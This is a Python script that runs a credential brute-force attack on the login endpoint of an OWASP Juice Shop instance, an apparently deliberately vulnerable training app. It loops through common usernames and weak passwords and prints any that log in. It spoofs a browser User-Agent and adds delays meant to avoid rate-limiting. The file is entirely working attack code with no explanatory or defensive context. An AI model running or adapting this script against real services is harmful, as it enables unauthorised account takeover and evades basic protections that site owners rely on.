import requests
import time

url = "https://juice-shop.herokuapp.com/rest/user/login"

users = ["admin", "user", "test"]
passwords = ["admin", "password", "123456"]

with requests.Session() as session:
    session.headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123"}

    for user in users:
        for password in passwords:
            data = {"email": user, "password": password}

            try:
                response = session.post(url, json=data)

                if response.status_code == 200:
                    print(f"Successful login with user: {user} and password: {password}")
                    time.sleep(1)  # Adding a delay to prevent being rate-limited
                    break  # Break out of the password loop if successful
                elif response.status_code == 401:
                    print(f"Failed login attempt with user: {user} and password: {password}")
                    time.sleep(0.5)  # Delay after failed attempt
            except requests.exceptions.RequestException as e:
                print(f"Exception occurred: {e}")
